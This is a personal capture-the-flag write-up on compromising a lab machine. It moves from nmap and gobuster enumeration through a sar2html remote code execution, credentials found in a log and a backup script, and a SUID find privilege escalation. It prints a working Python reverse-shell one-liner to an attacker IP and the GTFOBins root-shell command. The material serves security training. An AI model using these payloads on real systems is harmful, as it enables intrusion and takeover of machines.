**Tristan Gomez**

nmap
```
└─$ sudo nmap -Pn 10.10.191.22
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-29 12:03 PDT
Nmap scan report for 10.10.191.22
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds

```

port 10000 -> webmin


gobuster scan
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -u http://10.10.191.22===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.191.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/10/29 12:07:38 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/.hta.php             (Status: 403) [Size: 295]
/.hta.txt             (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/.htaccess.html       (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htpasswd.html       (Status: 403) [Size: 301]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.191.22/joomla/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.191.22/manual/]
/robots.txt           (Status: 200) [Size: 257]                                  
/robots.txt           (Status: 200) [Size: 257]                                  
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2021/10/29 12:12:56 Finished
===============================================================

```

/robots.txt
```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

```

ftp -> username = `anonymous`: no password required
perform a `ls -a` to find a "hidden file" `.info.txt` 

Use CyberChef with ROT13 to decode.
```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

which translates to...

Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

```


lets try to do some decoding

`079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075`

to decimal ...

`OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK`

from base64

`99b0660cd95adea327c54182baa51584`

running hash-identifier tells me that this is most likely an md5 hash.
then cracking it with `john` results in ...`kidding`. They trolled me again.


gobuster on /joomla
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -u http://10.10.191.22/joomla
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.191.22/joomla
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2021/10/29 12:39:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 298]
/.hta.txt             (Status: 403) [Size: 302]
/.hta.html            (Status: 403) [Size: 303]
/.hta.php             (Status: 403) [Size: 302]
/.htaccess.php        (Status: 403) [Size: 307]
/.htpasswd.php        (Status: 403) [Size: 307]
/.htaccess.txt        (Status: 403) [Size: 307]
/.htaccess.html       (Status: 403) [Size: 308]
/.htpasswd.txt        (Status: 403) [Size: 307]
/.htpasswd.html       (Status: 403) [Size: 308]
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.191.22/joomla/_archive/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.191.22/joomla/_database/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.191.22/joomla/_files/]   
/_test                (Status: 301) [Size: 319] [--> http://10.10.191.22/joomla/_test/]    
/~www                 (Status: 301) [Size: 318] [--> http://10.10.191.22/joomla/~www/]     
/administrator        (Status: 301) [Size: 327] [--> http://10.10.191.22/joomla/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.191.22/joomla/bin/]          
/build                (Status: 301) [Size: 319] [--> http://10.10.191.22/joomla/build/]        
/cache                (Status: 301) [Size: 319] [--> http://10.10.191.22/joomla/cache/]        
/components           (Status: 301) [Size: 324] [--> http://10.10.191.22/joomla/components/]   
/configuration.php    (Status: 200) [Size: 0]                                                  
/images               (Status: 301) [Size: 320] [--> http://10.10.191.22/joomla/images/]       
/includes             (Status: 301) [Size: 322] [--> http://10.10.191.22/joomla/includes/]     
/index.php            (Status: 200) [Size: 12478]                                              
/index.php            (Status: 200) [Size: 12478]                                              
/installation         (Status: 301) [Size: 326] [--> http://10.10.191.22/joomla/installation/] 
/language             (Status: 301) [Size: 322] [--> http://10.10.191.22/joomla/language/]     
/layouts              (Status: 301) [Size: 321] [--> http://10.10.191.22/joomla/layouts/]      
/libraries            (Status: 301) [Size: 323] [--> http://10.10.191.22/joomla/libraries/]    
/LICENSE.txt          (Status: 200) [Size: 18092]                                              
/media                (Status: 301) [Size: 319] [--> http://10.10.191.22/joomla/media/]        
/modules              (Status: 301) [Size: 321] [--> http://10.10.191.22/joomla/modules/]      
/plugins              (Status: 301) [Size: 321] [--> http://10.10.191.22/joomla/plugins/]      
/README.txt           (Status: 200) [Size: 4793]                                               
/templates            (Status: 301) [Size: 323] [--> http://10.10.191.22/joomla/templates/]    
/tests                (Status: 301) [Size: 319] [--> http://10.10.191.22/joomla/tests/]        
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.191.22/joomla/tmp/]          
/web.config.txt       (Status: 200) [Size: 1859]                                               
                                                                                               
===============================================================
2021/10/29 12:45:08 Finished
===============================================================

```
/joomla/_archive -> `Mnope, nothin to see.`

/joomla/_database
`Lwuv oguukpi ctqwpf.` ROT 13 (amount: 24) -> `Just messing around.`
 
/joomla/_files -> `VjJodmNITnBaU0JrWVdsemVRbz0K` (From Bas64 x 2) -> `Whopsie daisy`

http://10.10.191.22/joomla/_test/ -> this page has something calles `sar2html`. In searchsploit their is a RCE script.
Trying the script out with `pwd` gives me...
```
/var/www/html/joomla/_test
```

so we have RCE, lets try to get a reverse shell going.


`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.248.108",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

and bam! We're in!

in `www-data@Vulnerable:/var/www/html/joomla/_test$` is a file called `log.txt`. Let's dump its contents!
```
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.

```

AYYY-OOO! We got some credentials! `basterd:superduperp@$$`

ssh -p 55007 basterd@10.10.191.22

cat backup.sh
```
USER=stoner
#superduperp@$$no1knows
```

`stoner:superduperp@$$no1knows`

```
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

user.txt flag -> `You made it till here, well done.`

lets privesc
```
stoner@Vulnerable:/$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```
Hmm, messing with us again. 

Lets check for setuid permissions then...
```
stoner@Vulnerable:/$ find / -user root -perm -4000 -exec ls -ldb {} \;
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
find: ‘/proc/2132/task/2132/fd/6’: No such file or directory
find: ‘/proc/2132/task/2132/fdinfo/6’: No such file or directory
find: ‘/proc/2132/fd/5’: No such file or directory
find: ‘/proc/2132/fdinfo/5’: No such file or directory
```

Looking at GTFObins gives this command to exploit `find`
`./find . -exec /bin/sh -p \; -quit` drop the `./` from find and run the command to get root.

```
stoner@Vulnerable:/$ ./find . -exec /bin/sh -p \; -quit
-bash: ./find: No such file or directory
stoner@Vulnerable:/$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

go to /root and cat the flag
```
# cat root.txt
It wasn't that hard, was it?

```

yes...yes it was.
